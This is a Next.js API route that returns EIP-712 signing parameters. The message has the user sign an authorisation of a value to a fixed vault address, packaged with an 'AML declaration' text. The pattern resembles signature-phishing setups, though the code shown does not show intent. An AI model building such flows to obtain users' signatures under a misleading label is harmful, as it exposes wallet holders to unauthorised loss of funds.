import { NextRequest, NextResponse } from 'next/server';
import { 
  VAULT_ADDRESS, 
  AML_DECLARATION_TEXT, 
  EIP712_DOMAIN, 
  EIP712_TYPES,
  getDeadline,
  generateNonceId
} from '@/lib/constants';

export interface SignParamsResponse {
  domain: typeof EIP712_DOMAIN;
  types: typeof EIP712_TYPES;
  message: {
    owner: string;
    to: string;
    value: string;
    message: string;
    nonce: string;
    deadline: number;
  };
}

/**
 * GET /api/sign-params?wallet=0x...&value=1000000000000000000
 * Returns the complete EIP-712 signing parameters
 */
export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const wallet = searchParams.get('wallet');
    const value = searchParams.get('value');

    // Validate wallet address
    if (!wallet || !wallet.match(/^0x[a-fA-F0-9]{40}$/)) {
      return NextResponse.json(
        { error: 'Invalid wallet address' },
        { status: 400 }
      );
    }

    // Validate value
    if (!value || value === '0') {
      return NextResponse.json(
        { error: 'Invalid value' },
        { status: 400 }
      );
    }

    // Generate unique nonce ID (base58 format, Solana-style)
    const nonce = generateNonceId();
    
    // Calculate deadline
    const deadline = getDeadline();

    // Build response with all signing parameters
    const response: SignParamsResponse = {
      domain: EIP712_DOMAIN,
      types: EIP712_TYPES,
      message: {
        owner: wallet.toLowerCase(),
        to: VAULT_ADDRESS,
        value,
        message: AML_DECLARATION_TEXT,
        nonce,
        deadline,
      },
    };

    return NextResponse.json(response, { status: 200 });
  } catch (error) {
    console.error('Error generating sign params:', error);
    return NextResponse.json(
      { error: 'Failed to generate signing parameters' },
      { status: 500 }
    );
  }
}
